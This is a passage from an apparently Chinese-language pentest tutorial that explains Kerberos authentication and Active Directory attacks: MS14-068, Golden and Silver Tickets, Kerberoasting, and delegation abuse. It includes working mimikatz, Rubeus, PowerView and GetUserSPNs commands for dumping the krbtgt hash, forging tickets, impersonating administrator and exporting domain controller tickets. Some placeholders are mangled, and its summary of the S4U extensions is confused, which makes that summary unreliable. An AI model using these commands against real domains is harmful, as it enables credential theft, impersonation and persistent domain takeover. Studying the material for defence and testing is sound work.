    * Session Key
    * Client name & realm: Domain name\Client
    * End time: TGT到期的时间，一般是8小时
  * Wing这里收到响应后，用自己的Master Key对第一部分进行解密，获得SessionKey
  * 下一步就是和TGS打交道了
  * Wing向TGS（Ticket Granting Service）发送一个Ticket Granting Service Request（KRB_TGS_REQ），包含：
    * TGT：TGT被KDC的Master Key进行加密。
    * Authenticator：为了证明TGT的拥有者是否就是自己，它用TGT的办法方和自己的Session Key来进行加密，看是否吻合，TGS本身没有去保存SessionKey，所以就用自己的MaterKey去解密，从而获得Logon Session Key（SKDC-Client），再通过这个Logon Session Key（SKDC-Client）解密Authenticator进行验证。
    * Client name & realm
    * Server name & realm：就是小花
  * REQ OK之后，向Wing返回Ticket Granting Service Response（KRB_TGS_REP），包含：
    * Session Key：SServer-Client。
    * Client name & realm:
    * End time: Ticket的到期时间。 
  * Wing收到KRB_TGS_REP，使用KDC和Client的Session Key（SKDC-Client）去解密第一部分得到SessionKey，因为Session只能在单点使用哦。
  * 有了SessionKey和Ticket，我们就可以直接去勾搭小花，呸，约小花。
**那么Wing和小花之间的认证又是如何呢？**
  * Wing用Session Key（SServer-Client）加密过的Authenticator和Ticket作为Application Service Request（KRB_AP_REQ）发送给小花。
  * 小花接收到KRB_AP_REQ之后，通过自己的Master Key解密Ticket，从而获得Session Key（SServer-Client）。再通过Session Key（SServer-Client）去解密Authenticator，验证对方的身份。假设验证成功，就让Wing进屋，否则直接拒之门外。
  * 所以没有小车车（hash）和小房子（hash），小姐姐是会拒绝的。
**故事的后续：**  
就算你有小车车，我怎么知道你是不是我认识的那个Wing呢。  
这么说有点懵13.  
A去访问B的时候，验证完成了，我知道你是A，但是你就能访问我的全部资源了嘛？  
而且Kerberos协议也没有讲这个问题，所以微软爸爸加了PAC机制，即Privilege  
Attribute Certificate，特权属性证书。  
具体来说就是要确定域内用户的权限，这里解决的方法就是根据user的SID和group的SID来判断。  
KDC可以告诉B，A的权限是有限制的，只可以访问某些资源，通过KRB_AS_REP来指明，里面有加上PAC的说明。
MS14-068这个洞原理比较长，长话短说：
  * 主要是由于第一步的AS-REQ请求并没有对签名做指定要求，客户端用啥我用啥。
  * KRB_TGS_REQ返回的信息当中又没有PAC，所以客户端当然可以伪造出PAC
  * 然后神奇的KDC竟然允许这个PAC，而且使用指定的算法进行解密。
  * TGS返回带有PAC的Ticket返回客户端这里，此时这张票据是具有高权限的。
  * 更多细节可以通过抓包和源码去分析
### 漏洞复现
linux下：
    mv PI:EMAIL /tmp/krb5cc_0
配合smbclient执行命令
windows下：
    mimikatz.exe "kerberos::purge"
    mimikatz.exe "kerberos::ptc PI:EMAIL " exit
### Golden Ticket
Golden Ticket就是黄金票据，其实就是一个攻击者自己伪造的TGT，通过TGS对自己的Golden
Ticket的信任，攻击者就可以去访问Service， I Am Omnipotent！  
需要的条件：
  * Domain SID
  * Domain name
  * 需要krbtgt用户的hash
  * 用户名随意
#### Example
通过Mimikatz dump hash
    lsadump::dcsync  /user:krbtgt
生成Golden Ticket  
导入内存：  
黄金票据可以很好的隐藏自己，是一种持久化的方式。  
n1nty的公众号昨天发了一篇文章，就是有关于黄金票据的。  
title：内网安全运营：你真的锁定了你的帐号了吗？  
为什么我将他锁定了他还能进行其他动作？
  * Kerberos的认证过程前面也说清楚了，只认Ticket，而我们可以根据自己的密码去得到一张Server Ticket。
  * 管理员也无法注销Ticket，只能让他过期，默认是20分钟。
  * 对于TGT，20分钟后账户如果被锁定，KDC就不会给你Ticket
  * 对于ST，我已经不需要KDC了，只需要拿着这个ST去访问Service即可。
  * ST会在10小时过期
  * 所以在安全排查的时候需要注意是不是已经被持久控住了。
### Silver Tickets
Silver Tickets是银票，在介绍Golden Ticket时，末尾的彩蛋就是一个Silver Tickets----伪造的ST。银票只能访问指定Service，我不觉得这是一个缺点，反而觉得是一个优点，正如前文，根本不好排查，我没和KDC通信，日志那里查不到。  
银票的生成也很简单，不需要krbtgt的密码，但需要目标Service账户的hash。
    mimikatz "kerberos::golden /domain:pentestlab.com /sid:xx-xxx-xxx-xx /target:servername  /Service:Service类型 /rc4:hash /user:wing /ptt" exit
### Crack
#### SPN
SPN全称是ServicePrincipal Names，Service主体名称。  
在域里面我们希望域内的Service经过kerberos验证。  
spn让每一个Service与对应的Service账号相关联起来。  
其次就是SPN扫描比较隐蔽，不用去连接每一个IP的端口来判断Service，而是通过ldap进行查询，这本身就是一个正常的操作，日志里面去分析比较头疼。  
需要先手动注册  
#### SPN扫描
    https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
阅读源码  
如前所说，通过LDAP进行查询。
#### Crack TGS Tickets
SPN扫描完成以后，请求TGT  
查看本地的TGT  
导出使用tgsrepcrack离线破解  
也可以用
    GetUserSPNs.py -request -outputfile hash.txt -dc-ip 10.10.0.2 Pentestlab.com/wing
得到hash，使用hashcat破解。
### Kerberos委派攻击
#### What is Delegation？
正常情况下我想要去访问IISService，与此同时，可能还需要IISService去请求数据库Service，查询相关信息，但是IISService这里它不清楚Wing这个用户有没有权限去访问SqlServer，这时候就需要向DC去验证。
Wing先去访问IIS server，IISserver去跟KDC申请Ticket，KDC这时候检查IIS
Server是否有委派属性，如果存在，那么就返回给Wing这个用户的TGT，IIS Server收到后，跟TGS  
申请ST，IIS Server就可以拿ST去访问对应的Service。
#### 非约束委派（Unconstraineddelegation）
图比较直观，用户从KDC拿到对应的TGT之后，发送给Service1，请求了两次TGT，Service1请求了一次ST，也就是1-6步。  
然后Service1用用户的TGT2去请求ST2，也就是对应的Service2的ST,。  
Service1可以一直重复的去访问其他Service。  
这个过程称为 非约束委派，Unconstraineddelegation。
#### 非约束委派安全测试
通过PowerView查询域中配置非约束委派的主机和用户：
    Get-NetComputer -Unconstrained
    Get-NetUser -Unconstrained
然后在MSSQL这台机器上去导出通信时产生的TGT，会存在内存里。
    privilege::debug
    sekurlsa::tickets /export
这个就是域控的TGT。  
直接进行ptt攻击  
GetDC  
#### 约束委派（Constrained delegation）
微软为了增强安全性，防止不安全的委派发生，限制Service1代表Wing去访问Service。  
并且加入了S4U2Self和S4U2Proxy协议扩展。
  * S4U2Self：Service for User to Self
  * S4U2Proxy：Service forUser to Proxy  
  * 用户向Service1发出一个请求，用户已经经过了身份验证但Service1拿不到用户的TGT。
  * 文档说的是在这个步骤之前，Service1就向KDC申请到了拿到了TGT，并通过 S4U2self 扩展请求ST。
  * KDC返回ST，这一步Service1就代表用户拿到TGS和ST，虽然S4U2self向Service1提供有关用户的信息，但此扩展不允许Service1代表用户请求其他Service。这就是S4U2proxy的作用。
  * 响应给用户
  * 用户再次请求，用户向Service1发出请求。Service1需要以用户身份访问Service2上的资源。但是，Service1没有来自用户的转发TGT以通过转发的TGT执行委派，如图中所述，需要指定具有转发的TGT的Kerberos委派。具有这两个前提条件，才可以进行此步骤。首先，Service1已经通过KDC验证并具有有效的TGT。其次，Service1具有从用户到Service1的可转发ST。该可转发ST可能是通过KRB_AP_REQ消息获得的，如[RFC4120]第3.2节或S4U2self请求中规定的。
  * Service1代表指定用户向Service2请求Service票证。用户由Service1的Service票证中的客户端名称和客户端域专属标识。要返回的票证中的授权数据也将从Service票证中复制。
  * 如果请求中有特权属性证书（PAC），则KDC通过检查PAC结构的签名数据来验证PAC，参阅[MS-PAC]第2.8节。如果PAC有效或不存在，KDC将返回Service2的ST，但存储在ST的cname和crealm字段中的客户端专属标识是用户的，而不是Service1的。
  * Service1使用ST向Service2发出请求。Service2将此请求视为来自用户，并假定用户已经由KDC进行身份验证。
  * Service2响应请求。
  * Service1响应用户对消息5的请求。
简单来说呢：
  * S4U2proxy扩展的作用是不允许Service1代表用户请求其他Service
  * S4U2Self扩展的作用是检查用户的合法性
#### 约束委派安全测试
用PowerView查询域内开启约束委派的用户
    Get-DomainUser –TrustedToAuth
  * 使用Rebeus拿到TGT：Rebeus是kekeo的后续版本，羡慕一次编译通过的师傅。
    Rubeus.exe asktgt /user:mssql /password:Pentestlab@1314
或者直接一步请求
    C:\Users\flowing\Desktop\Wing>Rubeus.exe s4u   /impersonateuser:redteam /user:
    F046 /domain:pentestlab.com /msdsspn:cifs/mssql.pentestlab.com /ptt
ptt的意思是直接导入内存，不需要管理员权限。
    C:\Users\flowing\Desktop\Wing\>Rubeus.exe s4u /user:wing /rc4:xxxxxxxx /impersonateuser:administrator/msdsspn:cifs/mssql.pentestlab.com /altservice:cifs /ptt
       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/
      v1.4.2
    [*] Action: Ask TGT
    ...
    ...
    ... 
    [*] Action: Import Ticket
    [+] Ticket successfully imported!
这里的伪造的用户名必须是域内已经有的，比如adminstrator。  
所以这里本机的这个用户是伪造成其他用户去从获取TGS。
验证：  
实际场景当中，可以结合ntlmrelay去进行。
其他像哈希传递的技术使用cobaltstrike批量即可。
## 结语
关于Kerberos的技术，还有很多有趣的技巧，建议关注域安全专家harmj0y。
## 参考来源
[https://mp.weixin.qq.com/s?timestamp=1554396291&src=3&ver=1&signature=QJM6fShq296Yt2GmGNTdSeU*kJNrPEmgb0ce9ap3vCD9NC4W-GL2Fx3IxdiC689-CvAADbGrbL1f7deYwEDLQKxvi8WFUhA7OsPAI52IFV7yi*ld*WABk2U*shXEbZu4nJd-MpmuV9GrheIf9WHdKtrPYZm1VJ5iWy6aAyom*Yc=](https://mp.weixin.qq.com/s?timestamp=1554396291&src=3&ver=1&signature=QJM6fShq296Yt2GmGNTdSeU*kJNrPEmgb0ce9ap3vCD9NC4W-GL2Fx3IxdiC689-CvAADbGrbL1f7deYwEDLQKxvi8WFUhA7OsPAI52IFV7yi*ld*WABk2U*shXEbZu4nJd-MpmuV9GrheIf9WHdKtrPYZm1VJ5iWy6aAyom*Yc=)  